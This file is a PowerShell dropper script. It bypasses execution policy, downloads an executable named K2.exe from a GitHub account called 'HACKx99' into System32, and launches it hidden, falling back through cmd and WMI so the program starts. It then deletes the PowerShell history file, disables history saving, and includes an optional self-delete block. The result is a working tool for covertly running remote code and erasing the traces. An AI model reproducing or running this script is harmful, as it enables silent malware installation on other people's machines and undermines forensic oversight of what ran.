# PowerShell Script to Download, Save, Run EXE Silently, and Clear History
# WARNING: This script requires Administrator privileges to write to System32.
# Running unknown EXEs can be dangerous - use at your own risk!

try {
    # Bypass execution policy for CurrentUser
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

    # Define paths and URL (use raw GitHub URL for direct download)
    $exeUrl = "https://raw.githubusercontent.com/HACKx99/WebSite/main/K2.exe"
    $system32Path = "$env:windir\System32\K2.exe"
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    # Download the EXE to System32
    Write-Output "Downloading EXE from $exeUrl..."
    Invoke-WebRequest -Uri $exeUrl -OutFile $system32Path -UseBasicParsing

    # Verify download
    if (Test-Path $system32Path) {
        Write-Output "EXE downloaded successfully to $system32Path"
        
        # Wait a moment to ensure file is completely written
        Start-Sleep -Seconds 2
        
        # Method 1: Start process with hidden window
        Write-Output "Attempting to run EXE..."
        $process = Start-Process -FilePath $system32Path -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        
        # Method 2: Alternative approach using cmd
        if (-not $process -or $process.HasExited) {
            Write-Output "Trying alternative method to run EXE..."
            cmd.exe /c start "" "$system32Path" 2>$null
        }
        
        # Method 3: Using WMI if other methods fail
        Start-Sleep -Seconds 3
        $running = Get-Process -Name "K2" -ErrorAction SilentlyContinue
        if (-not $running) {
            Write-Output "Trying WMI method..."
            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $system32Path
        }
        
        # Verify the process is running
        Start-Sleep -Seconds 2
        $runningProcess = Get-Process -Name "K2" -ErrorAction SilentlyContinue
        if ($runningProcess) {
            Write-Output "EXE is running successfully (PID: $($runningProcess.Id))"
        } else {
            Write-Warning "EXE started but may have exited quickly"
        }
    } else {
        throw "Download failed - file not found at $system32Path"
    }

    # Forcefully clear PowerShell history
    Write-Output "Cleaning up history..."
    Clear-History -ErrorAction SilentlyContinue
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
        Write-Output "History file removed"
    }
    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue

    Write-Output "Script executed successfully. EXE downloaded to System32 and run. History cleared."
} catch {
    Write-Error "Error: $($_.Exception.Message)"
    exit 1
} finally {
    # Optional: Self-delete if saved as .ps1 (uncomment if needed)
    # if ($MyInvocation.MyCommand.Path) { 
    #     Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue 
    # }
    exit 0
}
